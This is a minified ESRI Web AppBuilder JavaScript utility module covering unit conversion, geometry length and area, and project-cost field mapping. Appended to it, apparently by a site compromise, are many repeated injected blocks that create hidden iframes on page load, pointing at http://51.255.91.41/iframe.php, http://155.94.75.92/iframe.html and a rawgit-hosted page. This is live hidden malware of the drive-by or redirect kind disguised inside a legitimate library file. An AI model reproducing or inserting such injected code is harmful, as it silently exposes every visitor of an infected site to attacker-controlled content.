// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("esri/request esri/geometry/geometryEngine dojo/Deferred dojo/_base/lang jimu/dijit/Message dojo/_base/array".split(" "),function(h,e,k,f,l,g){var d={};d.units={feet:{lengthUnit:"feet",areaUnit:"square-feet",bufferUnit:"UNIT_FOOT",lengthAbbr:window.jimuNls.units.feetAbbr,areaAbbr:window.jimuNls.units.squareFeetAbbr},meters:{lengthUnit:"meters",areaUnit:"square-meters",bufferUnit:"UNIT_METER",lengthAbbr:window.jimuNls.units.metersAbbr,areaAbbr:window.jimuNls.units.squareMetersAbbr},miles:{lengthUnit:"miles",
areaUnit:"square-miles",bufferUnit:"UNIT_STATUTE_MILE",lengthAbbr:window.jimuNls.units.milesAbbr,areaAbbr:window.jimuNls.units.squareMilesAbbr},yards:{lengthUnit:"yards",areaUnit:"square-yards",bufferUnit:"UNIT_SURVEY_YARD",lengthAbbr:window.jimuNls.units.yardsAbbr,areaAbbr:window.jimuNls.units.squareYardsAbbr},kilometers:{lengthUnit:"kilometers",areaUnit:"square-kilometers",bufferUnit:"UNIT_KILOMETER",lengthAbbr:window.jimuNls.units.kilometersAbbr,areaAbbr:window.jimuNls.units.squareKilometerAbbr}};
d.switchToTab=function(c,b){c.selectTab(b)};d.removeNegativeExponents=function(c){return 1<c.toString().toLowerCase().split("e-").length?0:c};d.applyRounding=function(c,b){var a;if(isNaN(b)||null===b)b=2;a=Math.pow(10,b);c=Math.round(c*a)/a;return c=c.toFixed(b)};d.getLengthOfGeometry=function(c,b){var a,d;a=0;(d=e.simplify(c))&&(a=c.spatialReference.isWebMercator()||4326===c.spatialReference.wkid?e.geodesicLength(d,b):e.planarLength(d,b));return a};d.getAreaOfGeometry=function(c,b){var a,d;d=e.simplify(c);
a=0;d&&(a=c.spatialReference.isWebMercator()||4326===c.spatialReference.wkid?e.geodesicArea(d,b):e.planarArea(d,b));return a};d.deleteFeatures=function(c,b){var a=new k;h({url:c+"/deleteFeatures",content:{where:b,f:"json"}},{usePost:!0}).then(f.hitch(this,function(b){a.resolve(b)}),function(){a.reject(!1)});return a.promise};d.getUnitsAbbreviation=function(c,b){var a="";if("esriGeometryPolygon"===c||"polygon"===c)a=d.units[b].areaAbbr;else if("esriGeometryPolyline"===c||"polyline"===c)a=d.units[b].lengthAbbr;
return a};d.roundProjectCostValue=function(c,b){var a=0;b=parseFloat(b);switch(c){case "nearestWholeNumber":a=b.toFixed();break;case "nearestTen":a=eval(b.toFixed())/10;a=10*eval(a.toFixed());break;case "nearestHundred":a=eval(b.toFixed())/100;a=100*eval(a.toFixed());break;case "nearestThousand":a=eval(b.toFixed())/1E3;a=1E3*eval(a.toFixed());break;case "nearestTenThousands":a=eval(b.toFixed())/1E4;a=1E4*eval(a.toFixed());break;default:a=b.toFixed(2)}return a};d.getPrjAssetTableFields=function(c){var b=
{};g.forEach(c.fields,f.hitch(this,function(a){"ASSETGUID"===a.name.toUpperCase()?b.ASSETGUID=a.name:"COSTEQUATION"===a.name.toUpperCase()?b.COSTEQUATION=a.name:"SCENARIO"===a.name.toUpperCase()?b.SCENARIO=a.name:"TEMPLATENAME"===a.name.toUpperCase()?b.TEMPLATENAME=a.name:"GEOGRAPHYGUID"===a.name.toUpperCase()?b.GEOGRAPHYGUID=a.name:"PROJECTGUID"===a.name.toUpperCase()&&(b.PROJECTGUID=a.name)}));b.OBJECTID=c.objectIdField;return b};d.getPrjLayerFields=function(c){var b={};g.forEach(c.fields,f.hitch(this,
function(a){"PROJECTNAME"===a.name.toUpperCase()?b.PROJECTNAME=a.name:"DESCRIPTION"===a.name.toUpperCase()?b.DESCRIPTION=a.name:"TOTALASSETCOST"===a.name.toUpperCase()?b.TOTALASSETCOST=a.name:"GROSSPROJECTCOST"===a.name.toUpperCase()?b.GROSSPROJECTCOST=a.name:"GLOBALID"===a.name.toUpperCase()&&(b.GLOBALID=a.name)}));return b};d.getPrjMultiplierFields=function(c){var b={};g.forEach(c.fields,f.hitch(this,function(a){"DESCRIPTION"===a.name.toUpperCase()?b.DESCRIPTION=a.name:"TYPE"===a.name.toUpperCase()?
b.TYPE=a.name:"VALUE"===a.name.toUpperCase()?b.VALUE=a.name:"COSTINDEX"===a.name.toUpperCase()?b.COSTINDEX=a.name:"PROJECTGUID"===a.name.toUpperCase()&&(b.PROJECTGUID=a.name)}));b.OBJECTID=c.objectIdField;return b};d.showMessage=function(c){(new l({message:c})).message=c};d.evaluate=function(c){return(new Function("return "+c))()};d.validateEquation=function(c){var b;if(""===c||-1<c.indexOf("\x26")||-1<c.indexOf("|")||-1<c.indexOf(","))return!1;c=c.replace(/{measure}/ig,1);c=c.replace(/{totalmeasure}/ig,
1);c=c.replace(/{totalcount}/ig,1);if(-1!==c.indexOf("{")||-1!==c.indexOf("}"))return!1;try{return b=d.evaluate(c),isFinite(b)?!0:!1}catch(a){return!1}};return d});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});